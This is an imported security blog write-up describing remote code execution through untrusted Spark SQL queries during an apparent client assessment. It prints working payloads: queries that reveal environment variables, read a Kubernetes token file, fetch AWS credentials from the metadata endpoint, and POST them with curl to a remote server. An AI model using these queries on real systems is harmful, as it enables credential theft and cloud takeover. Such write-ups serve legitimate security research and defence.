---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-10-24_remote-code-execution-by-abusing-apache-spark-sql.md
original_filename: 2022-10-24_remote-code-execution-by-abusing-apache-spark-sql.md
title: Remote Code Execution by Abusing Apache Spark SQL
category: documents
detected_topics:
- cloud-security
- command-injection
- ssrf
- sqli
- otp
- api-security
tags:
- imported
- documents
- cloud-security
- command-injection
- ssrf
- sqli
- otp
- api-security
language: en
raw_sha256: 627fe42354fa2e8b7e42a321090ef96306c3b7fbfeeb405c5f4a6929c24eb4e5
text_sha256: ba5a1e38559f2bc9229bdcaf64a7457129d8d87698da5e31e4deca23bff3afd3
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# Remote Code Execution by Abusing Apache Spark SQL

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-10-24_remote-code-execution-by-abusing-apache-spark-sql.md
- Source Type: markdown
- Detected Topics: cloud-security, command-injection, ssrf, sqli, otp, api-security
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `627fe42354fa2e8b7e42a321090ef96306c3b7fbfeeb405c5f4a6929c24eb4e5`
- Text SHA256: `ba5a1e38559f2bc9229bdcaf64a7457129d8d87698da5e31e4deca23bff3afd3`


## Content

---
title: "Remote Code Execution by Abusing Apache Spark SQL"
url: "https://blog.stratumsecurity.com/2022/10/24/abusing-apache-spark-sql-to-get-code-execution/"
final_url: "https://blog.stratumsecurity.com/2022/10/24/abusing-apache-spark-sql-to-get-code-execution/"
authors: ["Colin McQueen"]
bugs: ["SQL injection", "RCE"]
publication_date: "2022-10-24"
added_date: "2022-11-01"
source: "pentester.land/writeups.json"
original_index: 1998
---

# Remote Code Execution by Abusing Apache Spark SQL

  * [ ](/author/colin/)

#### [Colin McQueen](/author/colin/)

24 Oct 2022 • 2 min read

Share

While performing a security assessment for an application, there was interesting functionality that allowed users to execute arbitrary Spark SQL queries over analytics data.

## Vulnerability

The blog post: [The Dangers of Untrusted Spark SQL Input in a Shared Environment](https://datapipelines.com/blog/the-dangers-of-untrusted-spark-sql-input-in-a-shared-environment/?ref=blog.stratumsecurity.com) mentioned there were two functions that allowed Java code to be executed. The problem was that the java.lang.Runtime class with the getRuntime().exec() method couldn't be used as the Spark SQL functions reflect() and java_method() only allowed static methods to be called from classes without instantiating the class. I needed to find a Java class with a static method that could allow me to exploit the Spark SQL functionality.

I was able to return environment variables and system properties using the SQL queries below.
  
  
  -- List environment variables
  SELECT reflect('java.lang.System', 'getenv')
  
  -- List system properties
  SELECT reflect('java.lang.System', 'getProperties')
  

The environment variables and system properties listed didn't have anything sensitive. The system properties revealed the Spark version being used, which later helped me achieve remote code execution.

## Path to Exploitation

While reviewing the Spark JavaDocs, an interesting class was discovered called org.apache.spark.TestUtils that had a static method called testCommandAvailable(). 

Reviewing the code on [GitHub](https://github.com/apache/spark/blob/v2.4.1/core/src/main/scala/org/apache/spark/TestUtils.scala?ref=blog.stratumsecurity.com), I saw Process(command).run() that allows system commands to be executed.

A Spark SQL payload was built using this class and method to execute system commands.

I was able to disclose their Kubernetes API token and AWS keys that had an excessive amount of permissions using the following queries:
  
  
  -- Read Kubernetes API token file
  SELECT * FROM csv.`/var/run/secrets/kubernetes.io/serviceaccount/token`
  
  -- Write the AWS keys to a file
  SELECT reflect('org.apache.spark.TestUtils', 'testCommandAvailable', 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/euwe1-redacted -o /opt/test.txt')
  
  -- Send the file contents to a remote controlled server to view
  SELECT reflect('org.apache.spark.TestUtils', 'testCommandAvailable', 'curl -X POST -F data=@/opt/test.txt http://remoteserver.stratumsecurity.com/test5.txt')
  

![](https://storage.ghost.io/c/3b/1b/3b1b83bf-194f-498a-acf4-016bfc6d6580/content/images/2022/10/awskeys-disclosed.png)Figure 1 - Disclosed AWS keys with code execution

After getting their AWS keys and checking permissions, I listed all the S3 buckets these keys had access as a proof of concept for the report.

![](https://storage.ghost.io/c/3b/1b/3b1b83bf-194f-498a-acf4-016bfc6d6580/content/images/2022/10/buckets-listed.png)Figure 2 - Listed S3 buckets using disclosed AWS keys
